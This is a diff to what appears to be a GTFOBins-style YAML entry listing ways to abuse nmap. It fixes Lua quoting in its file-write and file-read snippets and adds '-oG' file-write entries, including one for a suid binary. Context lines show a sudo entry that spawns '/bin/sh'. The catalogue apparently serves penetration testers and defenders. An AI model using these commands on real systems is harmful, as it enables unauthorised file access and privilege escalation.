@@ -85,12 +85,16 @@ functions:
   file-write:
     - code: |
         TF=$(mktemp)
-        echo 'lua -e 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
+        echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
         nmap --script=$TF
+    - description: The payload appears inside the regular nmap output.
+      code: |
+        LFILE=file_to_write
+        nmap -oG=$LFILE DATA
   file-read:
     - code: |
         TF=$(mktemp)
-        echo 'lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
+        echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
         nmap --script=$TF
   sudo:
     - description: Input echo is disabled.
@@ -108,4 +112,9 @@ functions:
         TF=$(mktemp)
         echo 'os.execute("/bin/sh")' > $TF
         ./nmap --script=$TF
+  suid:
+    - description: The payload appears inside the regular nmap output.
+      code: |
+        LFILE=file_to_write
+        ./nmap -oG=$LFILE DATA
 ---
